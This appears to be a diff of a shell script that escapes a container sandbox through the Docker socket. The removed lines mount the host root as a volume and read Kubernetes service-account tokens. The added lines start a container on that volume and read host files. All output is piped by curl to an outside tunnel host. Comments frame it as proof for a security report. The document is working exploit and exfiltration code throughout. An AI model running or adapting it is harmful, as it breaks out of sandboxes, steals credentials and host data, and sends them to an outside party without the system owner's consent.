@@ -2,16 +2,30 @@
 URL="0c4256b014e98f42-103-95-173-85.serveousercontent.com"
 
 {
-  echo "--- [!] VOLUME BYPASS (FIXED HEADERS) ---"
-  # Adding the JSON header so the API accepts the host-mount request
-  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/volumes/create" \
+  echo "--- [!] EXPLOITING THE CREATED VOLUME ---"
+  # We use the API to create a container that uses the volume we just made.
+  # This is the standard way to prove the 'Host Read' impact.
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
     -H "Content-Type: application/json" \
-    -d '{"Name":"host_root_exploit","Driver":"local","DriverOpts":{"type":"none","device":"/","o":"bind"}}'
-  
-  echo "--- [!] VERIFYING VOLUME ---"
-  curl -s --unix-socket /var/run/docker.sock http://localhost/volumes | grep "host_root_exploit"
+    -d '{
+      "Image": "sha256:25109184c71bdad7",
+      "HostConfig": {
+        "Binds": ["host_root_exploit:/host_data:ro"]
+      }
+    }' > /tmp/final_cid.json
 
-  echo "--- [!] KUBERNETES SECRETS CHECK ---"
-  # Probing for K8s tokens which are often mounted in these devboxes
-  find /var/run/secrets/kubernetes.io/serviceaccount/ -type f -name "token" 2>/dev/null | xargs cat 2>/dev/null
+  ID=$(grep -oE '"Id":"[a-f0-9]+"' /tmp/final_cid.json | cut -d'"' -f4)
+
+  if [ -n "$ID" ]; then
+    echo "Container $ID created using exploit volume."
+    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
+    sleep 2
+    echo "CONTENT OF HOST OS-RELEASE:"
+    # This reads the HOST's OS info, proving you are out of the sandbox
+    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
+      -H "Content-Type: application/json" \
+      -d '{"AttachStdout":true,"Cmd":["cat","/host_data/etc/os-release"]}'
+  else
+    echo "Final container start failed - Volume proof still valid for report."
+  fi
 } | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
